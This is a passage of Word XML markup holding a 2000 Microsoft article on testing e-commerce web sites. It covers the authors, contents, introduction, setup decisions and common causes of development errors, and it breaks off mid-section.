        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1278" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1279" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>As always, we hope this article has served you.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1280" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1281" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>I can’t wait to hear your comments and questions. Also, please do share your best and worst online shopping experiences below.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="66"/>
          <w:szCs w:val="66"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="66"/>
          <w:szCs w:val="66"/>
        </w:rPr>
        <w:t>Testing Process</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1282" w:name="testproc"/>
      <w:bookmarkEnd w:id="1282"/>
      <w:r>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Biraj</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Rath</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>, Author, NIIC (USA), Inc.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Raj </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Nath</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>, Program Manager, Microsoft Corporation</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Mukesh </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Agarwal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>, Program Manager, Microsoft Corporation</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Jas </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Lamba</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>, Program Manager, NIIC (USA), Inc.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">George </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Gianopoulos</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>, Reviewer, Microsoft Corporation</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Laura </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Hargrave</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>, Contributor, Microsoft Corporation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>July 2000</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Version 0.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Summary:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t> When setting up an e-commerce Web site on the Internet, rigorous testing is crucial to the implementation and maintenance of a reliable system that will create customer confidence. This article discusses the need for testing and the various types of tests that should be performed, including security testing, software and hardware reliability, and compatibility between all the elements of the system. (20 printed pages)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Contents</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="00B84F48" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId239" w:anchor="testproc_intro" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>Introduction</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId240" w:anchor="testproc_setup" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>Setting Up an E-Commerce System</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId241" w:anchor="testproc_need" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>The Need for Testing</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="008511E4">
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId242" w:anchor="testproc_types" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>Types of Testing for E-Commerce</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId243" w:anchor="testproc_web" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>Testing Web Tier</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId244" w:anchor="testproc_mid" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>Testing Middle Tier</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId245" w:anchor="testproc_data" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>Testing Data Tier</w:t>
        </w:r>
      </w:hyperlink>
      <w:hyperlink r:id="rId246" w:anchor="testproc_other" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
            <w:color w:val="00709F"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>Other Tests</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId247" w:anchor="testproc_conc" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>Conclusion</w:t>
        </w:r>
      </w:hyperlink>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3" w:name="testproc_intro"/>
      <w:bookmarkEnd w:id="1283"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>This paper discusses the essential testing stages that are conducted during the implementation of an e-commerce solution and its maintenance. It also covers specific types of e-commerce testing and defines their stages.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>This paper is targeted to the developer and system architect. The reader should be familiar with Microsoft® Windows® DNA architecture and have a thorough knowledge of testing terminology, such as Black Box testing, White Box testing, Unit testing, and Functional testing.</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4" w:name="testproc_setup"/>
      <w:bookmarkEnd w:id="1284"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Setting Up an E-Commerce System</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>E-commerce Web sites are not easy to set up. With a plethora of e-commerce solutions in the market, entrepreneurs have to make a few key decisions:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="179"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>The entrepreneur has to decide on the initial amount of investment required for an e-commerce Web site, as well as the volume of business of an e-commerce Web site over the Internet. Investment factors and business objectives dictate the type of software, database, or other applications that are required to set up the e-commerce Web site.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="179"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>There are specific elements involved in an e-commerce system. These elements range from domain name for the site to the merchant account for e-commerce transactions. Each of these elements requires a certain amount of scrutiny before setting up an e-commerce Web site.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="179"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Before launching the e-commerce Web site on the Internet, it requires rigorous testing. Some of the important and common types of testing include security testing, software and hardware reliability, and compatibility between all the elements of the system.</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5" w:name="testproc_need"/>
      <w:bookmarkEnd w:id="1285"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>The Need for Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>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Causes of Errors</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The most common causes of errors in an e-commerce system are:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="180"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Communication gaps between the developer and the business decision maker</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="180"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Time provided to a developer to complete the project</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="180"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Over commitment by the developer</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="180"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Insufficient testing and quality control</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="180"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Inadequate requirements gathering</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="180"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Introducing complex business processes into an e-commerce system</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="180"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Keeping pace with the fast changing e-commerce technology</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lastRenderedPageBreak/>
        <w:t>Communication gaps between the developer and the business decision maker</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>A communication gap between the developer and the business decision maker is normally due to subtle differences between them. The differences can be classified into five broad areas:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="181"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Thought processes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="181"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Background and experience</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="181"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Interests</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="181"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Priorities</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="181"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Language</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>For example, an entrepreneur with a financial marketing background wants to set up an online share-selling site. The developer with an engineering background might be unaware of the intricate details of the financial market. Therefore, the developer may not know to incorporate those features that can add value to other site visitors into the site, such as the prices of mutual funds.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Time provided to a developer to complete the project</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>A common source of errors in projects comes from time constraints in delivering a product. At best, a project schedule provides an educated guess that is based on what is known at the time. At worst, a project schedule is a wish-derived estimate with no basis in reality.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Assuming the best, previously unknown problems may present themselves during development and testing. This can lead to problems maintaining the schedule. To keep to the schedule, features can be cut. To keep the features, the schedule can be slipped. Failing to adjust the feature set or schedule when problems are discovered can lead to rushed work and flawed systems.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Over commitment by the developer</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>High enthusiasm can lead to over commitment by the developer. In these situations, developers are usually unable to adhere to deadlines or quality due to the lack of resources or required skills on the team.</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Insufficient testing and quality control</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
